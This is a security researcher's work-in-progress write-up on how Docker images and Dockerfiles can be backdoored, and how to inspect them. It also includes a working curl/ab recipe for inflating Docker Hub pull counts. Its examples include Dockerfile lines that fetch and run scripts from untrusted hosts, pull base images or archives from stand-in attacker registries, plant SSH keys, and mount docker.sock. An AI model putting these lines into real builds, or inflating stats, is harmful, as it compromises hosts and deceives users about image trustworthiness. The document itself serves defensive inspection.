# (WIP) Research on docker backdooring
Pantelis Roditis (09/07/2020)

As the main developer of echoCTF.RED, I have to develop docker containers quite
often that will be used as targets or challenges.

This leads to the unavoidable search on docker hub and github for docker images
and dockerfiles that may give be a hint on how to implement them my self.

During this time I have come across a load of different types of suspicious
docker images and repositories.

Just like any other software you download from the internet use common logic
and critical thinking. Do NOT blindly trust a docker image, simply because it
can be found on docker hub.

This document includes research on some of the docker features that can be
abused in just the right way to make them look innocent, and advice on what you
can inspect to determine if an image does good or bad.

This list is in no means complete, these include just some of the things that
I look for, when inspecting docker images.

Some of the mentioned details i have seen by accident while browsing docker hub
and some came as a realization after reading hundreds of dockerfiles.

## Docker Hub stats
First and foremost don't trust stats provided by docker hub, these can be very easy to manipulate.

If an image for an obscure application has suspiciously high numbers of pulls/stars then something might be fishy.

The pulls in particularly can be so easily abused that it takes less than a minute to make an image have thousands of pulls.

My favorite method is to use **ab** but **curl** can also work. Check the examples to get a better idea.

```sh
name="repo/image"
token=$( curl -s "https://auth.docker.io/token?service=registry.docker.io&scope=repository:${name}:pull" | jq -r .token )
curl -s -H "Authorization: Bearer $token" "https://registry.hub.docker.com/v2/${name}/manifests/latest" >/dev/null
# or
ab -n 50 -c 10 -H "Authorization: Bearer $token" "https://registry.hub.docker.com/v2/${name}/manifests/latest"
```

## `Dockerfile`
The truth is that almost every single statement that can be used on a `Dockerfile` can hide something sinister. The nature of docker images make it so that is quite hard to track and ensure that what is installed is clean of any malicious code.  


### The `FROM` statement
Usually one of the top most statements of a `Dockerfile`.  It is used to instruct docker to use another image as a base. Any following commands within the `Dockerfile` will be executed as if they were run from within a container of the imported image.

In general it is always a good idea to look for the `FROM` statements and trace them back on docker hub to see if they use official images or not. Some of the  tricks that can be found in `FROM` statements follows.

#### `FROM` Chaining
Another trick that I've seen be used is what I call the _FROM chaining_. This is for images that depend on another, that in turn depend on other etc. etc. All the images seem clean but somewhere in the midst of all those images there's the one that adds the backdoored bash or whatever.


#### Multi-stage builds
A `Dockerfile` can have more than one `FROM` statements. Import from a legitimate image, perform some tasks to confuse user and import a malicious image last to be executed.

```Dockerfile
FROM debian
RUN apt-get install curl bash
...
FROM backdoor
```

Although the image started with `FROM debian` it will end up running whatever `FROM backdoor` image has.

#### Image with URL as part of name
One of the things that `docker` will do for you is to parse as URL the image name. This means that the following statement is valid
```sh
FROM badregistry.attacker.io/repo/backdoor:latest
```

Upon building this image docker will connect to `badregistry.attacker.io` and attempt to fetch the image `repo/backdoor` and use this as a base for the container.



#### Unicode `FROM` image
This is mostly theoretical to be honest as docker fails to to use any image with non basic ascii characters. However, I have not researched this extensively, so using some unicode characters may still be possible.

It is here mostly for completeness (or in case i want to research this again in the future).

* [IDN homograph attack](https://en.wikipedia.org/wiki/IDN_homograph_attack)
* [Unicode Bidirectional Text Spoofing](http://unicode.org/reports/tr36/tr36-8.html#Bidirectional_Text_Spoofing)

### The RUN statement
Before i use a container i like to examine the what it runs on build time. I usually trace the all the `RUN` statements from the `Dockerfile`. Check for any out-of-ordinary commands being executed, any downloads that shouldn't be there etc.

I've seen a fair amount of the following attempt to download "backdoored" binaries in `Dockerfiles`.
```
RUN curl -sL https://IP/setup_14.x | bash -
```

Make sure that the image you're building, downloads files from official sources and pay attention at commands that redirect or pipe their output.

### The COPY/ADD statement
Pay close attention to `COPY` commands and more specificaly the
`COPY --from=<name|index>`.

Remember the multi-stage builds from above? This is where the COPY command may
come in handy.
```sh
FROM debian #index 0
...
FROM redhat #index 1
...
FROM backdoor #index 2
...
FROM debian #index 3
...
# Makes it hard to track what index each image has
COPY --from=2 /etc/sshd/ssh_host_key ~/.ssh/authorized_keys
```

Another statement is `ADD` that performs very similar tasks as `COPY` does but
with a few twists. One of them is the ability to fetch files from the network
to be added to the image.

```sh
ADD https://some.bad.site/backdoor.tgz /tmp
RUN tar zxf /tmp/backdoor.tgz -C /
```

### The CMD statement
This defines the default command to be passed to the `ENTRYPOINT` when the
image is run. I make sure the default command looks ok and if it refers to a
script, i inspect its contents to try and figure out what it does.

```sh
CMD ["/bin/ba.sh"]
```

You can also inspect the command used by using the docker command, such as
```sh
docker image inspect badimage:lastest|grep -i cmd
```

### The ENTRYPOINT statement
The `ENTRYPOINT` defines the `init` for the image. The command from `CMD` is passed to this.

I always inspect the `ENTRYPOINT` entries and their contents.
```sh
ENTRYPOINT ["/something-that-looks-or-has-suspicious-contents.sh"]
```

## Package manager repos
Pay attention at what package managers the container uses and ensure there are no bad repos in there.

System package managers can be manipulated to query specific repositories. You may see the common `RUN apt-get update && apt-get install bash`, but this `bash` package may be hosted on a non official repository.

It is always good to check the files for the package managers used. Whatever it may be (go, npm, yarn, pip, apt, apk, rpm, dnf) check the corresponding files used to find the packages.


## The docker run/create CLI params
Pay close attention at the docker parameters required to run the container. The parameters that usually make me suspicious follows.

### `--privileged` & `--cap-add`
The `--privileged` parameter gives extended privileges to the container. Be weary of images that require this flag, specifically when the image has no logical need for it, e.g. for a webapp there is no need for a privileged container.

```sh
docker run --privileged php bash
docker run -it --privileged=true --net=host --name=tcpdump -v /var/lib/mysql:/capture --rm alpine-tcpdump -i any -vvnn -w /capture/file_name /capture.pcap icmp
```

The `--cap-add` adds Linux capabilities. Pay attention at what type of capabilities are added and check online for what the capability provides. Just like before apply critical thinking, very few types of applications require you to mess with capabilities.

```sh
docker run --cap-add SYS_ADMIN -t -i --rm ubuntu bash
```


### `--v`
Maps docker volumes, a volume can be any file or directory. Pay attention at what kind of volumes and what locations those volumes represent.

Keep in mind that the existence of these parameters do not mean that an image is malicious. Many containers require these options to operate properly, apply common logic when you see these.

Pay attention when images
* require access to `docker.sock`, this is almost never a good idea. This allows full control of the host `dockerd`, is as if you're giving root access to your server.
* variables with typos used for volumes (eg `$PWR` instead of `$PWD`). The shell will not complain and in some cases its not easy to spot.

```sh
docker run -v /var/run/docker.sock:/var/run/docker.sock badimage
docker run -v $PWR/etc:/etc badimage
```

## Refs
* https://www.fortinet.com/blog/threat-research/yet-another-crypto-mining-botnet
* https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers
